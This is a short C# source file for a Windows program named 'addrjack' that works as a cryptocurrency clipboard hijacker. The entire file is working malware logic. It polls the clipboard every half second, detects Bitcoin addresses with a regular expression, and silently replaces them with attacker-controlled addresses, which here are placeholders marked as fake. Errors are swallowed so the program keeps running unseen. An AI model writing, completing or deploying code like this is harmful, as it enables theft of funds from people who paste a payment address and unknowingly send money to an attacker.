using System;
using System.Threading.Tasks;
using System.Threading;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace addrjack
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            string malicious = "1fakedontsendinvalidmfBsbif4miY36v";
            string malicious_segwit = "3fakedontsendinvalidmfBsbif4miY36v";
            string bitcoin_regex_def = @"^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$";
            Regex bitcoin_regex = new Regex(bitcoin_regex_def);

            while (true)
            {
                try
                {
                    if (Clipboard.ContainsText())
                    {
                        string user_data = Clipboard.GetText();
                        if (bitcoin_regex.IsMatch(user_data))
                        {
                            if (user_data.StartsWith("3"))
                            {
                                Clipboard.SetText(malicious_segwit);
                            }
                            else
                            {
                                Clipboard.SetText(malicious);
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    // Something went wrong, just wait until the next go-around
                }

                Thread.Sleep(500);
            }

        }
    }
}
